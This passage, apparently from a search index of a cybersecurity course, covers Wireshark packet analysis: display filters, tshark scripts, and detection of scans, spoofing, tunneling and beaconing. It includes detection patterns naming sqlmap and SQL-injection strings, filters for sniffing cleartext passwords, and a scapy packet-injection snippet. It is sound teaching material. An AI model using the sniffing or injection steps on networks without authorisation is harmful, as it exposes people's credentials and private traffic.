icmp Filter by IP address: ip.addr == 192.168.1.1 # Any direction ip.src == 192.168.1.1 # Source only ip.dst == 192.168.1.1 # Destination only Filter by port: tcp.port == 80 # Any direction tcp.srcport == 443 # Source port tcp.dstport == 22 # Destination port Combine filters: ip.addr == 192.168.1.1 && tcp.port == 80 http || dns tcp.port == 443 && ip.src == 10.0.0.5 Logical operators: - && or and : Both conditions must be true - || or or : Either condition true - ! or not : Negation","title":"Basic Display Filter Syntax"},{"location":"LECTURES/unit6/lesson6-1/#common-security-filters","text":"Find login credentials (if not encrypted): http.request.method == \"POST\" ftp.request.command == \"PASS\" Find DNS queries: dns.qry.name contains \"malicious\" Find TCP connections: tcp.flags.syn == 1 && tcp.flags.ack == 0 Find specific HTTP methods: http.request.method == \"POST\" http.request.uri contains \"/admin\" Find errors: http.response.code >= 400 tcp.analysis.retransmission Find large packets (potential data exfiltration): frame.len > 1000 Find suspicious user agents: http.user_agent contains \"sqlmap\" http.user_agent contains \"nikto\"","title":"Common Security Filters"},{"location":"LECTURES/unit6/lesson6-1/#analyzing-common-protocols","text":"","title":"Analyzing Common Protocols"},{"location":"LECTURES/unit6/lesson6-1/#http-traffic","text":"HTTP is unencrypted and reveals everything. Let's analyze an HTTP request: GET /index.html HTTP/1.1 Host: example.com User-Agent: Mozilla/5.0 Accept: text/html In Wireshark: 1. Filter for http 2. Find a GET request 3. Right-click \u2192 Follow \u2192 HTTP Stream 4. See the entire conversation in plain text You can see: - URLs visited - Cookies - Form data - User agents - Server responses Security note : This is why HTTPS is crucial. HTTP traffic is completely visible to anyone on the network.","title":"HTTP Traffic"},{"location":"LECTURES/unit6/lesson6-1/#https-traffic","text":"HTTPS encrypts HTTP, so you'll see: - TLS handshake (establishing encryption) - Encrypted application data (unreadable) - Certificate information (visible during handshake) Filter: tls or ssl You can see: - Which sites are visited (from SNI in Client Hello) - IP addresses - Certificate validity - TLS version - Cipher suites But you can't see: - Specific URLs - Transmitted data - Cookies or credentials","title":"HTTPS Traffic"},{"location":"LECTURES/unit6/lesson6-1/#dns-traffic","text":"DNS queries reveal a lot about user activity: Filter: dns You can see: - What domains are being resolved - Response IP addresses - Query types (A, AAAA, MX, TXT, etc.) Security uses: - Detect DNS tunneling (data exfiltration through DNS) - Find connections to known malicious domains - Identify command and control traffic - Spot DGA (Domain Generation Algorithm) patterns Example filter for DNS queries only: dns.flags.response == 0","title":"DNS Traffic"},{"location":"LECTURES/unit6/lesson6-1/#tcp-three-way-handshake","text":"Understanding TCP handshakes is fundamental: SYN : Client \u2192 Server (initiating connection) SYN-ACK : Server \u2192 Client (acknowledging and returning SYN) ACK : Client \u2192 Server (acknowledging server's SYN) Filter to see only handshakes: tcp.flags.syn == 1 What this reveals: - Which services are being accessed - Successful vs. failed connections - Port scanning activity (many SYNs, few ACKs)","title":"TCP Three-Way Handshake"},{"location":"LECTURES/unit6/lesson6-1/#ftp-traffic-unencrypted-file-transfer","text":"FTP sends credentials in plaintext: Filter: ftp You'll see: - USER command (username) - PASS command (password in plain text!) - File transfers - Directory listings Right-click a packet \u2192 Follow \u2192 TCP Stream to see the entire session. Security lesson : FTP is incredibly insecure. Use SFTP or FTPS instead.","title":"FTP Traffic (Unencrypted File Transfer)"},{"location":"LECTURES/unit6/lesson6-1/#detecting-attacks-with-wireshark","text":"","title":"Detecting Attacks with Wireshark"},{"location":"LECTURES/unit6/lesson6-1/#port-scanning","text":"SYN Scan : Many SYN packets to different ports, few responses tcp.flags.syn == 1 && tcp.flags.ack == 0 Look for: - Single source IP - Many different destination ports - High packet rate - Many RST responses (closed ports)","title":"Port Scanning"},{"location":"LECTURES/unit6/lesson6-1/#arp-spoofing","text":"ARP poisoning redirects traffic by lying about MAC addresses. Filter: arp Look for: - Duplicate IP addresses with different MACs - Many ARP replies without corresponding requests - Gratuitous ARP (announcements without requests) Filter for duplicate IPs: arp.duplicate-address-detected","title":"ARP Spoofing"},{"location":"LECTURES/unit6/lesson6-1/#malware-communication","text":"Indicators: - Unusual ports - Suspicious domains in DNS queries - Regular beacon intervals (malware checking in) - Large uploads (data exfiltration) - Connections to known malicious IPs Filter for beaconing (regular intervals): tcp && frame.time_delta > 60 && frame.time_delta < 61","title":"Malware Communication"},{"location":"LECTURES/unit6/lesson6-1/#password-sniffing","text":"If credentials are sent unencrypted: HTTP authentication: http.authbasic FTP passwords: ftp.request.command == \"PASS\" Telnet login: telnet && tcp.port == 23 Right-click \u2192 Follow Stream to see full credential exchange.","title":"Password Sniffing"},{"location":"LECTURES/unit6/lesson6-1/#advanced-wireshark-techniques","text":"","title":"Advanced Wireshark Techniques"},{"location":"LECTURES/unit6/lesson6-1/#statistics-and-analysis","text":"Protocol Hierarchy : Statistics \u2192 Protocol Hierarchy - Shows breakdown of all protocols in capture - Identifies unusual traffic Conversations : Statistics \u2192 Conversations - Lists all pairs of communicating hosts - Shows data transferred - Identifies heavy users or data transfers I/O Graphs : Statistics \u2192 I/O Graph - Visualizes traffic over time - Spots spikes or patterns - Useful for DDoS analysis","title":"Statistics and Analysis"},{"location":"LECTURES/unit6/lesson6-1/#following-streams","text":"Right-click any packet \u2192 Follow \u2192 [protocol] Stream Shows entire conversation in readable format. Works for: - TCP Stream - UDP Stream - HTTP Stream - TLS Stream (shows encrypted data)","title":"Following Streams"},{"location":"LECTURES/unit6/lesson6-1/#exporting-objects","text":"For HTTP/HTTPS captures: File \u2192 Export Objects \u2192 HTTP Extracts all files transferred: - Images - JavaScript - CSS - Downloads - Malware samples (be careful!)","title":"Exporting Objects"},{"location":"LECTURES/unit6/lesson6-1/#time-display-formats","text":"View \u2192 Time Display Format - Seconds since beginning of capture - Absolute time - Delta time (since previous packet) Useful for identifying timing patterns.","title":"Time Display Formats"},{"location":"LECTURES/unit6/lesson6-1/#coloring-rules","text":"View \u2192 Coloring Rules Wireshark colors packets by default: - Light blue: UDP - Light purple: TCP - Black: Errors - Green: HTTP - Light yellow: Windows-specific traffic You can create custom rules: tcp.analysis.retransmission \u2192 Red (possible network issues) dns.qry.name contains \"malware\" \u2192 Red (suspicious DNS)","title":"Coloring Rules"},{"location":"LECTURES/unit6/lesson6-1/#capturing-strategies","text":"","title":"Capturing Strategies"},{"location":"LECTURES/unit6/lesson6-1/#targeted-capture","text":"Don't capture everything\u2014be specific: Capture filter for HTTP only: port 80 or port 443 Capture specific host: host 192.168.1.100 Capture subnet: net 192.168.1.0/24 Exclude broadcast noise: not broadcast and not multicast","title":"Targeted Capture"},{"location":"LECTURES/unit6/lesson6-1/#ring-buffer-for-long-term-capture","text":"For continuous monitoring: 1. Capture \u2192 Options 2. Enable \"Use multiple files\" 3. Set ring buffer (e.g., 100 files of 10 MB each) 4. Wireshark automatically rotates files","title":"Ring Buffer for Long-Term Capture"},{"location":"LECTURES/unit6/lesson6-1/#remote-capture","text":"Capture on one machine, analyze on another: 1. Set up tcpdump on remote server 2. Pipe traffic to Wireshark on local machine ssh user@remote \"tcpdump -i eth0 -w -\" | wireshark -k -i -","title":"Remote Capture"},{"location":"LECTURES/unit6/lesson6-1/#practical-scenarios","text":"","title":"Practical Scenarios"},{"location":"LECTURES/unit6/lesson6-1/#scenario-1-investigating-slow-network","text":"Start capture on affected user's system Reproduce the problem Statistics \u2192 Protocol Hierarchy Look for unusual protocols or heavy usage Check for retransmissions: tcp.analysis.retransmission Examine high-traffic conversations","title":"Scenario 1: Investigating Slow Network"},{"location":"LECTURES/unit6/lesson6-1/#scenario-2-suspected-data-exfiltration","text":"Capture traffic from suspected system Statistics \u2192 Conversations \u2192 sort by bytes Look for large uploads to unusual destinations Check DNS queries for suspicious domains Follow streams to examine content Export objects to find transferred files","title":"Scenario 2: Suspected Data Exfiltration"},{"location":"LECTURES/unit6/lesson6-1/#scenario-3-malware-analysis","text":"Capture traffic in isolated VM Execute malware sample Stop capture after observable activity Filter DNS queries: identify C2 domains Filter HTTP/HTTPS: identify beacon patterns Check for protocols on unusual ports Export malware downloads","title":"Scenario 3: Malware Analysis"},{"location":"LECTURES/unit6/lesson6-1/#best-practices","text":"Capture with permission : Only on networks you own or have authorization Secure captures : Packet captures may contain sensitive data Use appropriate filters : Don't capture more than needed Save important captures : They're evidence Document findings : Note unusual patterns Practice regularly : Skills improve with use Stay updated : New protocols and attacks emerge constantly","title":"Best Practices"},{"location":"LECTURES/unit6/lesson6-1/#legal-and-ethical-considerations","text":"Important : Packet capture can reveal: - Passwords and credentials - Private communications - Financial information - Medical records - Trade secrets Rules: - Only capture on networks you own or have written permission - Don't capture in public Wi-Fi without authorization - Treat captured data as highly sensitive - Follow company security policies - Understand local laws on network monitoring In many jurisdictions, unauthorized packet capture is illegal wiretapping.","title":"Legal and Ethical Considerations"},{"location":"LECTURES/unit6/lesson6-1/#tools-that-complement-wireshark","text":"tcpdump : Command-line packet capture (often used on servers) tcpdump -i eth0 -w capture.pcap port 80 tshark : Command-line version of Wireshark (great for scripting) tshark -r capture.pcap -Y http.request -T fields -e http.host NetworkMiner : Extracts artifacts from pcap files CapAnalysis : Web-based pcap analyzer Zeek (formerly Bro): Network security monitoring platform","title":"Tools That Complement Wireshark"},{"location":"LECTURES/unit6/lesson6-1/#whats-next","text":"Wireshark is a skill that develops over time. Start by: 1. Capturing your own web browsing 2. Analyzing different protocols 3. Practicing with public pcap files 4. Participating in CTF challenges 5. Contributing to investigations In upcoming lessons, we'll use Wireshark to analyze specific attack scenarios and learn how to detect sophisticated threats. Every security professional needs packet analysis skills\u2014it's the ground truth of what's really happening on a network. Keep practicing, and you'll develop an intuition for what's normal vs. suspicious in network traffic. That intuition is invaluable in cybersecurity.","title":"What's Next"},{"location":"LECTURES/unit6/lesson6-2/","text":"Advanced Wireshark Techniques and Protocol Analysis You know the basics of Wireshark. Now let's explore advanced techniques that security professionals use to hunt threats, analyze complex protocols, and extract forensic evidence from network traffic. Advanced Display Filters Filter Operators Comparison operators: eq or == Equal ne or != Not equal gt or > Greater than lt or < Less than ge or >= Greater than or equal le or <= Less than or equal Logical operators: and or && Logical AND or or || Logical OR not or ! Logical NOT Membership operators: in Value in set contains String contains substring matches Regex match Complex Filter Examples Find large HTTP responses: http.response && frame.len > 10000 Detect potential data exfiltration: (http.request.method == \"POST\" || ftp-data) && frame.len > 50000 Find failed authentication attempts: http.response.code == 401 || http.response.code == 403 Detect potential C2 beaconing (regular intervals): tcp.flags.push == 1 && tcp.len < 100 && tcp.len > 0 Find cleartext passwords: tcp contains \"password=\" || tcp contains \"pwd=\" || tcp contains \"pass=\" Detect SQL injection attempts: http.request.uri contains \"union select\" || http.request.uri contains \"' or 1=1\" Find encrypted traffic without proper certificates: ssl.handshake.type == 11 && !ssl.handshake.certificate Filter Macros Create reusable filter expressions: # Define in profile ${web} = tcp.port == 80 || tcp.port == 443 || tcp.port == 8080 # Use in filters ${web} && ip.addr == 192.168.1.100 Protocol Analysis HTTP/HTTPS Analysis Extract HTTP objects: 1. File \u2192 Export Objects \u2192 HTTP 2. Filter by content type 3. Save files for analysis Analyze HTTP headers: http.request.method == \"GET\" http.user_agent contains \"curl\" http.cookie contains \"session\" http.referer Detect suspicious user agents: http.user_agent contains \"sqlmap\" || http.user_agent contains \"nikto\" || http.user_agent contains \"nmap\" || http.user_agent contains \"masscan\" Find redirects: http.response.code == 301 || http.response.code == 302 DNS Analysis Identify DNS tunneling: dns.qry.name.len > 50 Find unusual query types: dns.qry.type != 1 && dns.qry.type != 28 # Not A or AAAA records Detect DGA (Domain Generation Algorithm): dns.qry.name matches \"[a-z]{20,}\\\\.\" # Long random-looking domains Extract all queried domains: dns.flags.response == 0 Statistics \u2192 DNS \u2192 Query/Response TLS/SSL Analysis Identify weak cipher suites: ssl.handshake.ciphersuite == 0x0005 # RSA_WITH_RC4_128_SHA (weak) Find expired certificates: x509ce.validity.notAfter < \"2024-01-01\" Detect SSL/TLS downgrade attacks: ssl.handshake.version < 0x0303 # TLS 1.2 is 0x0303 Extract certificate details: x509ce.dNSName x509af.utcTime SMB Analysis Detect lateral movement: smb2.cmd == 5 # Session Setup Find file access: smb2.filename Detect credential theft attempts: ntlmssp.auth.username TCP Stream Analysis Following Streams Right-click packet \u2192 Follow \u2192 TCP Stream Use cases: - Reconstruct file transfers - Read email content - View HTTP requests/responses - Analyze protocol handshakes Filter after following: tcp.stream eq 42 Stream Index Show all streams: Statistics \u2192 Conversations \u2192 TCP Filter specific stream: tcp.stream == 5 Find streams with errors: tcp.analysis.retransmission || tcp.analysis.lost_segment Advanced Statistical Analysis I/O Graphs Statistics \u2192 I/O Graph Create multiple graphs: 1. Total packets over time 2. HTTP traffic (port 80) 3. HTTPS traffic (port 443) 4. DNS queries Example filters: Graph 1: (no filter) - All traffic Graph 2: tcp.port == 80 - HTTP Graph 3: tcp.port == 443 - HTTPS Graph 4: dns - DNS queries Identify anomalies: - Traffic spikes - Regular beaconing patterns - Unusual times (3 AM traffic) Protocol Hierarchy Statistics \u2192 Protocol Hierarchy Shows: - Percentage of each protocol - Packet count - Byte count Identify unusual protocols: - High percentage of ICMP (C2 tunneling?) - Unexpected protocols (IRC on corporate network?) - Encrypted protocols on unusual ports Endpoints Statistics \u2192 Endpoints View by: - Ethernet (MAC addresses) - IPv4/IPv6 (IP addresses) - TCP/UDP (ports) Identify: - Top talkers (most traffic) - Unusual connections - Port scanning (many ports from one IP) Conversations Statistics \u2192 Conversations Shows: - Communication pairs - Packets/bytes exchanged - Duration Use to: - Find large data transfers - Identify C2 communication - Detect lateral movement - Track specific connections Expert Information Analyze \u2192 Expert Information Categories: - Errors : Malformed packets, checksums - Warnings : Unusual events - Notes : Standard protocol events - Chats : Application messages Common indicators: - TCP retransmissions (network issues or attacks) - TCP out-of-order (possible MITM) - Checksum errors (corrupted or crafted packets) - Connection resets (blocked connections) Decrypting Traffic Decrypting SSL/TLS Method 1: Using Server Private Key Edit \u2192 Preferences \u2192 Protocols \u2192 TLS RSA keys list \u2192 Add IP: server IP Port: 443 Protocol: http Key file: server.key Limitations: - Only works with RSA key exchange - Doesn't work with forward secrecy (DHE/ECDHE) Method 2: Using Browser Session Keys Set environment variable: export SSLKEYLOGFILE=/path/to/sslkeys.log Launch browser, capture traffic: 1. Edit \u2192 Preferences \u2192 Protocols \u2192 TLS 2. (Pre)-Master-Secret log filename: /path/to/sslkeys.log This works with forward secrecy! Decrypting WPA/WPA2 Capture WPA handshake: 1. Capture during client connection 2. Edit \u2192 Preferences \u2192 Protocols \u2192 IEEE 802.11 3. Enable decryption 4. Add key: wpa-pwd:password:SSID Requirements: - Captured 4-way handshake - Know the password Packet Manipulation Editing Packets Method 1: Hex editing Right-click packet \u2192 Copy \u2192 Bytes as Hex Stream Edit and inject using: # Create raw packet file xxd -r -p hex_data > packet.bin # Inject with scapy from scapy.all import * packet = rdpcap(\"packet.bin\") send(packet) Method 2: Using tcprewrite # Change MAC addresses tcprewrite --enet-smac=00:11:22:33:44:55 \\ --enet-dmac=aa:bb:cc:dd:ee:ff \\ --infile=input.pcap --outfile=output.pcap # Change IP addresses tcprewrite --srcipmap=0.0.0.0/0:10.0.0.0/24 \\ --dstipmap=0.0.0.0/0:192.168.1.0/24 \\ --infile=input.pcap --outfile=output.pcap Wireshark Profiles Creating Custom Profiles Edit \u2192 Configuration Profiles \u2192 New Per-profile settings: - Custom coloring rules - Display columns - Filter expressions - Preferences Example profiles: - Web traffic analysis - Malware investigation - Wireless analysis - VoIP troubleshooting Custom Columns Edit \u2192 Preferences \u2192 Appearance \u2192 Columns Useful custom columns: Type: Custom Title: \"HTTP Host\" Field: http.host Type: Custom Title: \"DNS Query\" Field: dns.qry.name Type: Custom Title: \"TLS SNI\" Field: tls.handshake.extensions_server_name Advanced Coloring Rules View \u2192 Coloring Rules Example rules: Red - Retransmissions: tcp.analysis.retransmission Orange - HTTP errors: http.response.code >= 400 Yellow - DNS queries: dns.flags.response == 0 Green - Successful HTTP: http.response.code == 200 Purple - Encrypted traffic: ssl || tls Command-Line Power: tshark tshark is Wireshark's CLI version. Basic Usage # Capture to file tshark -i eth0 -w capture.pcap # Capture with filter tshark -i eth0 -f \"port 80\" -w http.pcap # Read from file tshark -r capture.pcap # Apply display filter tshark -r capture.pcap -Y \"http.request\" Field Extraction # Extract HTTP hosts tshark -r capture.pcap -Y \"http.request\" -T fields -e http.host # Extract source IPs and ports tshark -r capture.pcap -T fields -e ip.src -e tcp.srcport # Extract DNS queries tshark -r capture.pcap -Y \"dns.flags.response == 0\" -T fields -e dns.qry.name # Extract TLS SNI tshark -r capture.pcap -Y \"tls.handshake.type == 1\" -T fields -e tls.handshake.extensions_server_name Statistics with tshark # Protocol hierarchy tshark -r capture.pcap -q -z io,phs # Conversations tshark -r capture.pcap -q -z conv,tcp # HTTP requests tshark -r capture.pcap -q -z http,tree # DNS queries tshark -r capture.pcap -q -z dns,tree Automation Scripts Extract all URLs: #!/bin/bash tshark -r $1 -Y \"http.request\" -T fields \\ -e ip.src -e http.host -e http.request.uri | \\ awk '{print $1 \" http://\" $2 $3}' | \\ sort -u > urls.txt Find potential C2 beaconing: #!/bin/bash tshark -r $1 -T fields -e ip.dst -e frame.time_relative | \\ awk '{print $1, $2-prev[$1]; prev[$1]=$2}' | \\ awk '$2 > 55 && $2 < 65 {count[$1]++} END {for (ip in count) if (count[ip] > 10) print ip, count[ip]}' Detecting Common Attacks Port Scan Detection SYN scan: tcp.flags.syn == 1 && tcp.flags.ack == 0 Multiple destination ports from same source: Statistics \u2192 Conversations \u2192 TCP Sort by \"Packets A\u2192B\" ARP Spoofing Detection arp.duplicate-address-detected Or look for: - Same IP with different MACs - Gratuitous ARP from non-gateway DNS Tunneling Detection dns.qry.name.len > 50 || dns.response.len > 512 HTTP Tunneling http.request.method == \"CONNECT\" Brute Force Detection HTTP: http.response.code == 401 Count 401s per source IP. SSH: tcp.port == 22 && tcp.flags.syn == 1 High volume of connections. Performance Optimization For Large Captures Use capture filters (not display filters): # Only HTTP/HTTPS tcpdump -i eth0 -w capture.pcap \"port 80 or port 443\" Split large files: editcap -c 100000 large.pcap split.pcap Index files: Wireshark automatically creates .pcapng indexes for faster access. Use tshark for analysis: Faster than GUI for batch processing. Practical Scenarios Scenario 1: Investigating Data Exfiltration Steps: 1. Filter large outbound transfers: tcp.port == 443 && tcp.len > 1000 2. Statistics \u2192 Conversations 3. Identify unusual destinations 4. Follow TCP streams 5. Export objects if HTTP 6. Check DNS queries for suspicious domains Scenario 2: Malware C2 Analysis Steps: 1. Find beaconing patterns (I/O Graph) 2. Extract regular connections 3. Filter DNS queries: dns.flags.response == 0 4. Follow TCP streams for C2 traffic 5. Extract IOCs (IPs, domains, URIs) Scenario 3: Incident Response Steps: 1. Timeline with I/O Graph 2. Identify initial compromise time 3. Track lateral movement: smb2 || rdp || winrm 4. Find data exfiltration 5. Extract IOCs 6. Document in timeline Key Takeaways Advanced Wireshark skills: - Complex display filters - Protocol-specific analysis - Stream reconstruction - Statistical analysis - Decryption techniques - CLI automation with tshark Detection techniques: - Port scans - ARP spoofing - DNS tunneling - C2 beaconing - Data exfiltration Best practices: - Use appropriate filters - Leverage statistics - Automate with tshark - Create custom profiles - Document findings Remember: - Wireshark shows what happened - Your job is interpreting it - Context is everything - Practice makes perfect Mastering Wireshark takes time. Analyze real traffic, practice with CTF challenges, and review public PCAPs. The more you use it, the more patterns you'll recognize. Next lesson, we'll explore network forensics\u2014using captured traffic as evidence and reconstructing attack timelines.","title":"Lesson 6.2"},{"location":"LECTURES/unit6/lesson6-2/#advanced-wireshark-techniques-and-protocol-analysis","text":"You know the basics of Wireshark. Now let's explore advanced techniques that security professionals use to hunt threats, analyze complex protocols, and extract forensic evidence from network traffic.","title":"Advanced Wireshark Techniques and Protocol Analysis"},{"location":"LECTURES/unit6/lesson6-2/#advanced-display-filters","text":"","title":"Advanced Display Filters"},{"location":"LECTURES/unit6/lesson6-2/#filter-operators","text":"Comparison operators: eq or == Equal ne or != Not equal gt or > Greater than lt or < Less than ge or >= Greater than or equal le or <= Less than or equal Logical operators: and or && Logical AND or or || Logical OR not or ! Logical NOT Membership operators: in Value in set contains String contains substring matches Regex match","title":"Filter Operators"},{"location":"LECTURES/unit6/lesson6-2/#complex-filter-examples","text":"Find large HTTP responses: http.response && frame.len > 10000 Detect potential data exfiltration: (http.request.method == \"POST\" || ftp-data) && frame.len > 50000 Find failed authentication attempts: http.response.code == 401 || http.response.code == 403 Detect potential C2 beaconing (regular intervals): tcp.flags.push == 1 && tcp.len < 100 && tcp.len > 0 Find cleartext passwords: tcp contains \"password=\" || tcp contains \"pwd=\" || tcp contains \"pass=\" Detect SQL injection attempts: http.request.uri contains \"union select\" || http.request.uri contains \"' or 1=1\" Find encrypted traffic without proper certificates: ssl.handshake.type == 11 && !ssl.handshake.certificate","title":"Complex Filter Examples"},{"location":"LECTURES/unit6/lesson6-2/#filter-macros","text":"Create reusable filter expressions: # Define in profile ${web} = tcp.port == 80 || tcp.port == 443 || tcp.port == 8080 # Use in filters ${web} && ip.addr == 192.168.1.100","title":"Filter Macros"},{"location":"LECTURES/unit6/lesson6-2/#protocol-analysis","text":"","title":"Protocol Analysis"},{"location":"LECTURES/unit6/lesson6-2/#httphttps-analysis","text":"Extract HTTP objects: 1. File \u2192 Export Objects \u2192 HTTP 2. Filter by content type 3. Save files for analysis Analyze HTTP headers: http.request.method == \"GET\" http.user_agent contains \"curl\" http.cookie contains \"session\" http.referer Detect suspicious user agents: http.user_agent contains \"sqlmap\" || http.user_agent contains \"nikto\" || http.user_agent contains \"nmap\" || http.user_agent contains \"masscan\" Find redirects: http.response.code == 301 || http.response.code == 302","title":"HTTP/HTTPS Analysis"},{"location":"LECTURES/unit6/lesson6-2/#dns-analysis","text":"Identify DNS tunneling: dns.qry.name.len > 50 Find unusual query types: dns.qry.type != 1 && dns.qry.type != 28 # Not A or AAAA records Detect DGA (Domain Generation Algorithm): dns.qry.name matches \"[a-z]{20,}\\\\.\" # Long random-looking domains Extract all queried domains: dns.flags.response == 0 Statistics \u2192 DNS \u2192 Query/Response","title":"DNS Analysis"},{"location":"LECTURES/unit6/lesson6-2/#tlsssl-analysis","text":"Identify weak cipher suites: ssl.handshake.ciphersuite == 0x0005 # RSA_WITH_RC4_128_SHA (weak) Find expired certificates: x509ce.validity.notAfter < \"2024-01-01\" Detect SSL/TLS downgrade attacks: ssl.handshake.version < 0x0303 # TLS 1.2 is 0x0303 Extract certificate details: x509ce.dNSName x509af.utcTime","title":"TLS/SSL Analysis"},{"location":"LECTURES/unit6/lesson6-2/#smb-analysis","text":"Detect lateral movement: smb2.cmd == 5 # Session Setup Find file access: smb2.filename Detect credential theft attempts: ntlmssp.auth.username","title":"SMB Analysis"},{"location":"LECTURES/unit6/lesson6-2/#tcp-stream-analysis","text":"","title":"TCP Stream Analysis"},{"location":"LECTURES/unit6/lesson6-2/#following-streams","text":"Right-click packet \u2192 Follow \u2192 TCP Stream Use cases: - Reconstruct file transfers - Read email content - View HTTP requests/responses - Analyze protocol handshakes Filter after following: tcp.stream eq 42","title":"Following Streams"},{"location":"LECTURES/unit6/lesson6-2/#stream-index","text":"Show all streams: Statistics \u2192 Conversations \u2192 TCP Filter specific stream: tcp.stream == 5 Find streams with errors: tcp.analysis.retransmission || tcp.analysis.lost_segment","title":"Stream Index"},{"location":"LECTURES/unit6/lesson6-2/#advanced-statistical-analysis","text":"","title":"Advanced Statistical Analysis"},{"location":"LECTURES/unit6/lesson6-2/#io-graphs","text":"Statistics \u2192 I/O Graph Create multiple graphs: 1. Total packets over time 2. HTTP traffic (port 80) 3. HTTPS traffic (port 443) 4. DNS queries Example filters: Graph 1: (no filter) - All traffic Graph 2: tcp.port == 80 - HTTP Graph 3: tcp.port == 443 - HTTPS Graph 4: dns - DNS queries Identify anomalies: - Traffic spikes - Regular beaconing patterns - Unusual times (3 AM traffic)","title":"I/O Graphs"},{"location":"LECTURES/unit6/lesson6-2/#protocol-hierarchy","text":"Statistics \u2192 Protocol Hierarchy Shows: - Percentage of each protocol - Packet count - Byte count Identify unusual protocols: - High percentage of ICMP (C2 tunneling?) - Unexpected protocols (IRC on corporate network?) - Encrypted protocols on unusual ports","title":"Protocol Hierarchy"},{"location":"LECTURES/unit6/lesson6-2/#endpoints","text":"Statistics \u2192 Endpoints View by: - Ethernet (MAC addresses) - IPv4/IPv6 (IP addresses) - TCP/UDP (ports) Identify: - Top talkers (most traffic) - Unusual connections - Port scanning (many ports from one IP)","title":"Endpoints"},{"location":"LECTURES/unit6/lesson6-2/#conversations","text":"Statistics \u2192 Conversations Shows: - Communication pairs - Packets/bytes exchanged - Duration Use to: - Find large data transfers - Identify C2 communication - Detect lateral movement - Track specific connections","title":"Conversations"},{"location":"LECTURES/unit6/lesson6-2/#expert-information","text":"Analyze \u2192 Expert Information Categories: - Errors : Malformed packets, checksums - Warnings : Unusual events - Notes : Standard protocol events - Chats : Application messages Common indicators: - TCP retransmissions (network issues or attacks) - TCP out-of-order (possible MITM) - Checksum errors (corrupted or crafted packets) - Connection resets (blocked connections)","title":"Expert Information"},{"location":"LECTURES/unit6/lesson6-2/#decrypting-traffic","text":"","title":"Decrypting Traffic"},{"location":"LECTURES/unit6/lesson6-2/#decrypting-ssltls","text":"Method 1: Using Server Private Key Edit \u2192 Preferences \u2192 Protocols \u2192 TLS RSA keys list \u2192 Add IP: server IP Port: 443 Protocol: http Key file: server.key Limitations: - Only works with RSA key exchange - Doesn't work with forward secrecy (DHE/ECDHE) Method 2: Using Browser Session Keys Set environment variable: export SSLKEYLOGFILE=/path/to/sslkeys.log Launch browser, capture traffic: 1. Edit \u2192 Preferences \u2192 Protocols \u2192 TLS 2. (Pre)-Master-Secret log filename: /path/to/sslkeys.log This works with forward secrecy!","title":"Decrypting SSL/TLS"},{"location":"LECTURES/unit6/lesson6-2/#decrypting-wpawpa2","text":"Capture WPA handshake: 1. Capture during client connection 2. Edit \u2192 Preferences \u2192 Protocols \u2192 IEEE 802.11 3. Enable decryption 4. Add key: wpa-pwd:password:SSID Requirements: - Captured 4-way handshake - Know the password","title":"Decrypting WPA/WPA2"},{"location":"LECTURES/unit6/lesson6-2/#packet-manipulation","text":"","title":"Packet Manipulation"},{"location":"LECTURES/unit6/lesson6-2/#editing-packets","text":"Method 1: Hex editing Right-click packet \u2192 Copy \u2192 Bytes as Hex Stream Edit and inject using: # Create raw packet file xxd -r -p hex_data > packet.bin # Inject with scapy from scapy.all import * packet = rdpcap(\"packet.bin\") send(packet) Method 2: Using tcprewrite # Change MAC addresses tcprewrite --enet-smac=00:11:22:33:44:55 \\ --enet-dmac=aa:bb:cc:dd:ee:ff \\ --infile=input.pcap --outfile=output.pcap # Change IP addresses tcprewrite --srcipmap=0.0.0.0/0:10.0.0.0/24 \\ --dstipmap=0.0.0.0/0:192.168.1.0/24 \\ --infile=input.pcap --outfile=output.pcap","title":"Editing Packets"},{"location":"LECTURES/unit6/lesson6-2/#wireshark-profiles","text":"","title":"Wireshark Profiles"},{"location":"LECTURES/unit6/lesson6-2/#creating-custom-profiles","text":"Edit \u2192 Configuration Profiles \u2192 New Per-profile settings: - Custom coloring rules - Display columns - Filter expressions - Preferences Example profiles: - Web traffic analysis - Malware investigation - Wireless analysis - VoIP troubleshooting","title":"Creating Custom Profiles"},{"location":"LECTURES/unit6/lesson6-2/#custom-columns","text":"Edit \u2192 Preferences \u2192 Appearance \u2192 Columns Useful custom columns: Type: Custom Title: \"HTTP Host\" Field: http.host Type: Custom Title: \"DNS Query\" Field: dns.qry.name Type: Custom Title: \"TLS SNI\" Field: tls.handshake.extensions_server_name","title":"Custom Columns"},{"location":"LECTURES/unit6/lesson6-2/#advanced-coloring-rules","text":"View \u2192 Coloring Rules Example rules: Red - Retransmissions: tcp.analysis.retransmission Orange - HTTP errors: http.response.code >= 400 Yellow - DNS queries: dns.flags.response == 0 Green - Successful HTTP: http.response.code == 200 Purple - Encrypted traffic: ssl || tls","title":"Advanced Coloring Rules"},{"location":"LECTURES/unit6/lesson6-2/#command-line-power-tshark","text":"tshark is Wireshark's CLI version.","title":"Command-Line Power: tshark"},{"location":"LECTURES/unit6/lesson6-2/#basic-usage","text":"# Capture to file tshark -i eth0 -w capture.pcap # Capture with filter tshark -i eth0 -f \"port 80\" -w http.pcap # Read from file tshark -r capture.pcap # Apply display filter tshark -r capture.pcap -Y \"http.request\"","title":"Basic Usage"},{"location":"LECTURES/unit6/lesson6-2/#field-extraction","text":"# Extract HTTP hosts tshark -r capture.pcap -Y \"http.request\" -T fields -e http.host # Extract source IPs and ports tshark -r capture.pcap -T fields -e ip.src -e tcp.srcport # Extract DNS queries tshark -r capture.pcap -Y \"dns.flags.response == 0\" -T fields -e dns.qry.name # Extract TLS SNI tshark -r capture.pcap -Y \"tls.handshake.type == 1\" -T fields -e tls.handshake.extensions_server_name","title":"Field Extraction"},{"location":"LECTURES/unit6/lesson6-2/#statistics-with-tshark","text":"# Protocol hierarchy tshark -r capture.pcap -q -z io,phs # Conversations tshark -r capture.pcap -q -z conv,tcp # HTTP requests tshark -r capture.pcap -q -z http,tree # DNS queries tshark -r capture.pcap -q -z dns,tree","title":"Statistics with tshark"},{"location":"LECTURES/unit6/lesson6-2/#automation-scripts","text":"Extract all URLs: #!/bin/bash tshark -r $1 -Y \"http.request\" -T fields \\ -e ip.src -e http.host -e http.request.uri | \\ awk '{print $1 \" http://\" $2 $3}' | \\ sort -u > urls.txt Find potential C2 beaconing: #!/bin/bash tshark -r $1 -T fields -e ip.dst -e frame.time_relative | \\ awk '{print $1, $2-prev[$1]; prev[$1]=$2}' | \\ awk '$2 > 55 && $2 < 65 {count[$1]++} END {for (ip in count) if (count[ip] > 10) print ip, count[ip]}'","title":"Automation 